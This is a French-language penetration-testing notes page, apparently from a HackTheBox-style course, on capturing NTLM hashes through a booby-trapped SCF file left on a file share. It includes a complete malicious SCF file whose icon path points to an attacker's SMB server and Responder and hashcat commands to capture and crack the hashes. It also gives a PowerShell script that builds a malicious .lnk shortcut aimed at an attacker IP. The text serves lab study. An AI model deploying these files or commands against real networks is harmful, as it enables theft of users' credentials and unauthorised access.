# SCF on a File Share

### <mark style="color:red;">SCF on a File Share</mark>

{% hint style="warning" %}
Un fichier **SCF** (Shell Command File) sert normalement à des fonctions Windows simples (comme afficher le Bureau).

* Ce fichier contient une instruction qui peut indiquer où trouver son icône (`IconFile`).
* Si l’attaquant modifie cette ligne pour pointer vers un **chemin UNC** (ex. `\\monserveur\partage`) qu’il contrôle, alors :
  1. **Windows Explorer** va automatiquement essayer de se connecter à ce serveur pour récupérer l’icône.
  2. Cette connexion passe par **SMB** (protocole réseau Windows).
  3. Lors de cette tentative, Windows envoie automatiquement le **hash NTLM** du mot de passe de l’utilisateur connecté.
* L’attaquant, avec un outil comme **Responder** ou **Inveigh**, intercepte ce hash.
* Il peut ensuite essayer de le **craquer** pour obtenir le mot de passe en clair.
* Avec ce mot de passe, il peut **élever ses privilèges** ou accéder à d’autres systèmes.

En gros :\
C’est comme laisser traîner un raccourci piégé dans un dossier que tout le monde visite. Dès que quelqu’un ouvre ce dossier, son PC envoie par erreur son mot de passe (sous forme de hash) à l’attaquant.
{% endhint %}

#### <mark style="color:green;">Exemple de fichier SCF malveillant</mark>

**@Inventory.scf**

{% hint style="warning" %}
Nous mettons un **@** au début du nom du fichier pour qu'il apparaisse en haut du répertoire et soit vu et exécuté par l'Explorateur Windows dès que l'utilisateur accède au partage.&#x20;
{% endhint %}

```shell-session
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

<mark style="color:green;">**Starting Responder**</mark>

```shell-session
mrroboteLiot_1@htb[/htb]$ sudo responder -wrf -v -I tun0
```

<mark style="color:green;">**Cracking NTLMv2 Hash with Hashcat**</mark>

```shell-session
mrroboteLiot_1@htb[/htb]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

***

### <mark style="color:red;">Capturing Hashes with a Malicious .lnk File</mark>

Using SCFs no longer works on Server 2019 hosts

[.lnk](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943)

[Lnkbomb](https://github.com/dievus/lnkbomb)

<mark style="color:green;">**Generating a Malicious .lnk File**</mark>

```powershell-session

$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
